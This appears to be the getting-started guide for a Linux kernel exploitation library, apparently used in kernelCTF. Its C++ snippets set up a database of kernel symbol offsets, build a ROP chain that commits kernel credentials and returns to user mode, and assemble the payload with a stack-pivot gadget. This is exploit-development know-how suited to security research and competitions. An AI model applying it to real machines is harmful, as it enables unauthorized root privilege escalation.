# How to get started

### Creating a Database

1. Add the necessary includes to the exploit code.

    ```c++
    #include <cassert>
    #include <target/TargetDb.cpp>
    #include <test/kpwn/Kpwn.cpp>
    #include <util/incbin.cpp>
    #include <util/syscalls.cpp>
    #include <util/error.cpp>
    #include <util/pwn_utils.cpp>
    #include <payloads/Payload.cpp>
    #include <util/HexDump.cpp>
    #include <util/ArgumentParser.cpp>
    #include <pivot/PivotFinder.cpp>
    #include <pivot/StackPivot.cpp>
    ```

2. Include the **target_db** in the exploit. `INCBIN` creates a read-only section in the binary with the file contents.

    ```c++
    INCBIN(target_db, "target_db.kpwn");
    ```

3. Initialize **TargetDb** and detect which target it's being run on.

    ```c++
    TargetDb kpwn_db(target_db, target_db_size);
    ```

4. Already available in database structure and symbol offsets are documented in `kpwn_db/converter/config.py`. 
They are added for all supported targets.

5. If the needed symbol is not in database, use `StaticTarget` object to add it. One object per target needed. For example:

    ```c++
    StaticTarget st("kernelctf", "cos-105-17412.294.34");

    st.AddSymbol("nft_last_ops", 0x1acaf20);

    kpwn_db.AddStaticTarget(st);
    ```

6. Similar approach could be taken for adding structure and fields information:

    ```c++
    StaticTarget st("kernelctf", "cos-105-17412.294.34");

    st.AddStruct("nft_expr_ops", 128,
                {{"dump", 64, 8},
                {"type", 120, 8}});

    kpwn_db.AddStaticTarget(st);
    ```

    > [!NOTE]
    > `128` in the example above is a size of the `nft_expr_ops` structure. `{"dump", 64, 8}` field is located at the offset of 64 and as it's a pointer, size would be 8 for 64-bit architecture.

7. Auto-detection of target where exploit is going to be executed:

    ```c++
    auto target = kpwn_db.AutoDetectTarget();
    printf("[+] Running on target: %s %s\n", target.distro.c_str(), target.release_name.c_str());
    ```

### Building the Payload

After leaking a kernel address and calculating the KASLR base, you can begin constructing the exploit payload.

1. Initialize a `Payload` object. This will serve as the buffer for our ROP chain and other necessary data.

    ```c++
    Payload payload(1024);
    ```

2. Create the `RopChain`. This object is initialized with target-specific information and the KASLR base. You can then add predefined actions to it. The `Ret2Usr` utility helps in gracefully returning execution to a user-mode function after the kernel operations are complete.

    ```c++
    RopChain rop(target, kaslr_base);
    rop.AddRopAction(RopActionId::COMMIT_KERNEL_CREDS);
    RopUtils::Ret2Usr(rop, (void*)win);
    ```

### Assembling the Final Payload with PayloadBuilder

The `PayloadBuilder` automates the process of finding a suitable pivot gadget and combining it with your payload and ROP chain.

1. Initialize the `PayloadBuilder` with the target's available pivot gadgets and the KASLR base.

    ```c++
    PayloadBuilder builder(target.pivots, kaslr_base);
    ```

2. Add the `payload` object to the builder. You need to specify which register will point to your payload buffer (e.g., `Register::RSI`) and the offset within that buffer where the instruction pointer (`rip`) will be hijacked.

    ```c++
    uint64_t rip_off = fake_ops_offs + release_offs; // Calculated offset for RIP control
    builder.AddPayload(payload, Register::RSI, rip_off);
    ```

3. Add the `RopChain` to the builder.

    ```c++
    builder.AddRopChain(rop);
    ```

4. Build the final payload. The `Build()` method will find an appropriate pivot gadget that uses the specified register (`RSI` in this case) to redirect execution to your ROP chain. The necessary gadgets and the ROP chain itself will be written into the `payload` object you provided earlier.

    ```c++
    if(!builder.Build()) 
        exit(-1); 
    ```

Once built, the `payload` object contains the complete, ready-to-use exploit payload.
